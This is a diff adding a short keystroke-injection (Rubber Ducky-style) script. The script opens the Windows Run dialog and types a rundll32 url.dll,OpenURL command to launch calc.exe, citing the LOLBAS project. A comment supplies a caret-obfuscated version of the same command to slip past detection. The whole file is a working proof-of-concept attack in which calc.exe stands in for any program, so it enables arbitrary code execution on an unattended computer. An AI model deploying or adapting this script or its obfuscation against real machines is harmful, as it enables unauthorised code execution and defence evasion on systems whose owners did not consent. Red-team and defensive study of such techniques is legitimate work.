@@ -1,0 +1,9 @@
+REM by JOB
+REM Launch an executable by calling OpenURL, more info here https://lolbas-project.github.io/lolbas/Libraries/Url/
+GUI r
+DEFAULT_DELAY 350
+STRING rundll32.exe url.dll,OpenURL C:\Windows\System32\calc.exe
+REM obfuscated ver: rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+
+ENTER
+
